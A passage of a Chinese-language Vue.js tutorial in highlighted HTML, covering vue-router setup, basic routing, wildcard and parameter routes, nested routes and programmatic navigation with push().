punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://unpkg.com/vue-router/dist/vue-router.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="13-2-路由使用案例"><a href="#13-2-路由使用案例" class="headerlink" title="13.2 路由使用案例"></a>13.2 路由使用案例</h4><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">body</span><span class="token punctuation">{</span><span class="token property">padding</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span><span class="token property">margin</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">ul</span><span class="token punctuation">{</span><span class="token property">list-style</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">ul li</span><span class="token punctuation">{</span><span class="token property">display</span><span class="token punctuation">:</span> inline<span class="token punctuation">;</span> <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span> <span class="token property">margin-left</span><span class="token punctuation">:</span> 15px<span class="token punctuation">;</span>  <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 15px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">ul li a</span><span class="token punctuation">{</span><span class="token property">text-decoration</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span> <span class="token property">color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span> <span class="token property">font-size</span><span class="token punctuation">:</span> 18px<span class="token punctuation">;</span> <span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">ul li a:hover</span><span class="token punctuation">{</span><span class="token property">color</span><span class="token punctuation">:</span> yellow<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/vue.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/vue-router.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span> <span class="token property">height</span><span class="token punctuation">:</span> 70px<span class="token punctuation">;</span> <span class="token property">background</span><span class="token punctuation">:</span> #00BFFF<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>img/logo.png<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>70<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">margin-left</span><span class="token punctuation">:</span>100px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/a<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>首页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/b<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Java<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/c<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>HTML5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/d<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Python<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span> <span class="token property">height</span><span class="token punctuation">:</span> 680px<span class="token punctuation">;</span> <span class="token property">background</span><span class="token punctuation">:</span> lemonchiffon<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token comment">// vue的路由旨在为单页面应用开发提供便捷</span><span class="token comment">//1.定义链接跳转的模板（组件）</span><span class="token keyword">const</span> t1 <span class="token operator">=</span> <span class="token punctuation">{</span>template<span class="token operator">:</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;p&gt;index&lt;/p&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">const</span> t2 <span class="token operator">=</span> <span class="token punctuation">{</span>template<span class="token operator">:</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;p&gt;Java&lt;/p&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">const</span> t3 <span class="token operator">=</span> <span class="token punctuation">{</span>template<span class="token operator">:</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;p&gt;HTML5&lt;/p&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">const</span> t4 <span class="token operator">=</span> <span class="token punctuation">{</span>template<span class="token operator">:</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;p&gt;PYTHON&lt;/p&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">const</span> myrouter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>routes<span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span>path<span class="token operator">:</span><span class="token string">"/a"</span><span class="token punctuation">,</span>component<span class="token operator">:</span>t1<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span>path<span class="token operator">:</span><span class="token string">"/b"</span><span class="token punctuation">,</span>component<span class="token operator">:</span>t2<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span>path<span class="token operator">:</span><span class="token string">"/c"</span><span class="token punctuation">,</span>component<span class="token operator">:</span>t3<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span>path<span class="token operator">:</span><span class="token string">"/d"</span><span class="token punctuation">,</span>component<span class="token operator">:</span>t4<span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>router<span class="token operator">:</span>myrouter<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="13-3-动态路由匹配"><a href="#13-3-动态路由匹配" class="headerlink" title="13.3 动态路由匹配"></a>13.3 动态路由匹配</h4><h6 id="13-3-1-通配符"><a href="#13-3-1-通配符" class="headerlink" title="13.3.1 通配符"></a>13.3.1 通配符</h6><blockquote><p><code>*</code>可以匹配任意路径</p></blockquote><p>例如：</p><ul><li><code>/user-*</code> 匹配所有以<code>user-</code>开头的任意路径</li><li><code>/*</code> 匹配所有路径</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> myrouter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    routes<span class="token operator">:</span><span class="token punctuation">[</span>        <span class="token punctuation">{</span>path<span class="token operator">:</span><span class="token string">"/user-*"</span><span class="token punctuation">,</span>component<span class="token operator">:</span><span class="token operator">...</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span>path<span class="token operator">:</span><span class="token string">"/*"</span><span class="token punctuation">,</span>component<span class="token operator">:</span><span class="token operator">...</span><span class="token punctuation">}</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>注意</code>如果使用通配符定义路径，需要注意路由声明的顺序</p><h6 id="13-3-2-路由参数"><a href="#13-3-2-路由参数" class="headerlink" title="13.3.2 路由参数"></a>13.3.2 路由参数</h6><ul><li><code>/a/:id</code> 可以匹配 <code>/a/</code>开头的路径</li></ul><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/a/101<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>首页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">const</span> t1 <span class="token operator">=</span> <span class="token punctuation">{</span>template<span class="token operator">:</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;p&gt;index:{{$route.params.id}}&lt;/p&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> myrouter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        routes<span class="token operator">:</span><span class="token punctuation">[</span>            <span class="token punctuation">{</span>path<span class="token operator">:</span><span class="token string">"/a/:id"</span><span class="token punctuation">,</span>component<span class="token operator">:</span>t1<span class="token punctuation">}</span>        <span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        router<span class="token operator">:</span>myrouter    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="13-3-3-优先级"><a href="#13-3-3-优先级" class="headerlink" title="13.3.3 优先级"></a>13.3.3 优先级</h6><p>如果一个路径匹配了多个路由，则按照路由的配置顺序：路由定义的越早优先级就越高。</p><h4 id="13-4-嵌套路由"><a href="#13-4-嵌套路由" class="headerlink" title="13.4 嵌套路由"></a>13.4 嵌套路由</h4><blockquote><p>在一级路由的组件中显示二级路由</p></blockquote><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/a<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>首页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/a/c1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>首页-c1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/a/c2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>首页-c2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">const</span> t1 <span class="token operator">=</span> <span class="token punctuation">{</span>        template<span class="token operator">:</span><span class="token string">"&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt;index&lt;hr/&gt;&lt;router-view&gt;&lt;/router-view&gt;&lt;/div&gt;"</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> t2 <span class="token operator">=</span> <span class="token punctuation">{</span>template<span class="token operator">:</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div&gt;t2&lt;/div&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> t3 <span class="token operator">=</span> <span class="token punctuation">{</span>template<span class="token operator">:</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div&gt;t3&lt;/div&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> myrouter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        routes<span class="token operator">:</span><span class="token punctuation">[</span>            <span class="token punctuation">{</span>                path<span class="token operator">:</span><span class="token string">"/a"</span><span class="token punctuation">,</span>                component<span class="token operator">:</span>t1<span class="token punctuation">,</span>                children<span class="token operator">:</span><span class="token punctuation">[</span>                    <span class="token punctuation">{</span>                        path<span class="token operator">:</span><span class="token string">"c1"</span><span class="token punctuation">,</span>                        component<span class="token operator">:</span>t2                    <span class="token punctuation">}</span><span class="token punctuation">,</span>                    <span class="token punctuation">{</span>                        path<span class="token operator">:</span><span class="token string">"c2"</span><span class="token punctuation">,</span>                        component<span class="token operator">:</span>t3                    <span class="token punctuation">}</span>                <span class="token punctuation">]</span>            <span class="token punctuation">}</span>        <span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        router<span class="token operator">:</span>myrouter    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="13-5-编程式导航"><a href="#13-5-编程式导航" class="headerlink" title="13.5 编程式导航"></a>13.5 编程式导航</h4><h6 id="13-5-1-push"><a href="#13-5-1-push" class="headerlink" title="13.5.1 push()"></a>13.5.1 push()</h6><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>按钮<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-view</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">const</span> t1 <span class="token operator">=</span> <span class="token punctuation">{</span>        template<span class="token operator">:</span><span class="token string">"&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt;index&lt;/div&gt;"</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> myrouter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        routes<span class="token operator">:</span><span class="token punctuation">[</span>            <span class="token punctuation">{</span>                path<span class="token operator">:</span><span class="token string">"/a"</span><span class="token punctuation">,</span>                component<span class="token operator">:</span>t1            <span class="token punctuation">}</span>        <span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        router<span class="token operator">:</span>myrouter<span class="token punctuation">,</span>        methods<span class="token operator">:</span><span class="token punctuation">{</span>            <span class="token function-variable function">test</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token comment">//js代码实现路由跳转：编程式导航</span>                myrouter<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">"/a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="13-5-2-push-参数"><a href="#13-5-2-push-参数" class="headerlink" title="13.5.2 push()参数"></a>13.5.2 push()参数</h6><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//1.字符串</span>myrouter<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">"/a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2.对象</span>myrouter<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span>path<span class="token operator">:</span><span class="token string">"/a"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//3.命名的路由  name参数指的是定义路由时指定的名字</span>myrouter<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span>name<span class="token operator">:</span><span class="token string">"r1"</span><span class="token punctuation">,</span>params<span class="token operator">:</span><span class="token punctuation">{</span>id<span class="token operator">:</span><span class="token number">101</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//4.URL传值，相当于/a?id=101</span>myrouter<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span>path<span class="token operator">:</span><span class="token string">"/a"</span><span class="token punctuation">,</span>query<span class="token operator">:</span><span class="token punctuation">{</span>id<span class="token operator">:</span><span class="token number">101</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span 